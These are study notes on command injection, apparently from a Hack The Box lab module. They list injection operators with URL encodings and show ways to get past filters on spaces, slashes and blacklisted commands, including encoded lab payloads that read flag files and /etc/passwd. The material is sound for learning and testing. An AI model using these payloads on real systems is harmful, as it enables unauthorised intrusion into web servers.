[Command Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

To inject an additional command to the intended one, we may use any of the following operators:
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|------------------------|-------------------------|-----------------------------|----------------------|
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | `` ` ` `` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

Just be mindful that operators may not work on specific set ups:
- In addition to the above, there are a few unix-only operators, that would work on Linux and `macOS`, but would not work on `Windows`, such as wrapping our injected command with double backticks (``) or with a sub-shell operator (`$()`).
- In general, for basic command injection, all of these operators can be used for command injections regardless of the web application language, framework, or back-end server. So, if we are injecting in a `PHP` web application running on a Linux server, or a `.Net` web application running on a `Windows` back-end server, or a `NodeJS` web application running on a macOS back-end server, our injections should work regardless.
- The only exception may be the semi-colon `;`, which will not work if the command was being executed with `Windows Command Line (CMD)`, but would still work if it was being executed with Windows PowerShell.

- Reminder: Nothing in the network tab of dev tools means the filtering is happening on the front-end. It is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.

- If there's front end filtering, intercept a successful POST/GET, and then modify that successful request in BURP.
- If the app says something like "Invalid input" then maybe theres some blacklisted characters - first identify the character and then try encoding or double encoding
- new-line character is usually not blacklisted, as it may be needed in the payload itself. (`\n` | `%0a`)

## Bypassing white spaces
- If spaces are blacklisted, try using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same
- Using the `($IFS)` Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use ${IFS} where the spaces should be, the variable should be automatically replaced with a space, and our command should work. e.g `127.0.0.1%0a${IFS}`
- There are many other methods we can utilize to bypass space filters. For example, we can use the Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces, as follows: `Lumington@htb[/htb]$ {ls,-la}` See more here [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
- `127.0.0.1%0a{ls,-la}` will inject the `ls -la` command

  ## Bypassing `/` or `\`
  One such technique we can use for replacing slashes (or any other character) is through `Linux Environment Variables`
  - For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:
```
Lumington@htb[/htb]$ echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games
```
- So, if we start at the 0 character, and only take a string of length 1, we will end up with only the / character, which we can use in our payload:
```
Lumington@htb[/htb]$ echo ${PATH:0:1}
/
```
- We can also use the same concept to get a semi-colon character, to be used as an injection operator.
```
Lumington@htb[/htb]$ echo ${LS_COLORS:10:1}
;
```

Same works on Windows:
```
C:\htb> echo %HOMEPATH:~6,-11%
\

---
OR
---

PS C:\htb> $env:HOMEPATH[0]
\

---
OR
---

PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>

```

## Character Shifting
There are other techniques to produce the required characters without using them, like shifting characters. For example, the following Linux command shifts the character we pass by 1. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with man ascii), then add it instead of [ in the below example. This way, the last printed character would be the one we need:
```
Lumington@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Lumington@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```
Find the user on in the `home` directory:
-`ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home}`

Find the flag in that users directory:
- `ip=127.0.0.1%0a{c"a"t,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}`

## Bypassing commands
### For both `Windows` and `Linux`
- One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote "
- The important things to remember are that we cannot mix types of quotes and the number of quotes must be even.
- One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

### For Linux
- commands are case sensitive so case manipulation might work
Both will work: 
```
who$@ami
w\ho\am\i
```

### For Windows
- Commands are case in-sensitive so case manipulation won't work
Use `^`
```
C:\htb> who^ami

21y4d
```
### Command Reversing
Somehow this works..
```
Lumington@htb[/htb]$ echo 'whoami' | rev
imaohw
```
So writing it in reverse and commanding it backwards like this in Linux:
```
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```
And this in Windows:
```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```
Both will execute the `whoami` command if the command is typed in backwards

**Note: using <<< to avoid using a pipe |, which is a filtered character.**

### Encoding commands
```
Lumington@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
For this to work on Linux - we would have to convert the string from utf-8 to utf-16 before we base64 it, as follows:
```
Lumington@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```
For this to work on Windows, execute it with a PowerShell sub-shell (iex "$()"), as follows:

```
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```
- Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
- Step 1: base64 the thing `Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 `
- Step 2: make sure it decodes nicely locally `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
- Step 3: hey theres a blank space there, that's illegal. Use an alternative like `%09` - `bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
-  
Step 4: All together now - `ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`

# Tools
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)

Skill Assessment: `%26c\a\t%09${PATH:0:1}flag.txt` which translates to --> `& cat /flag.txt`
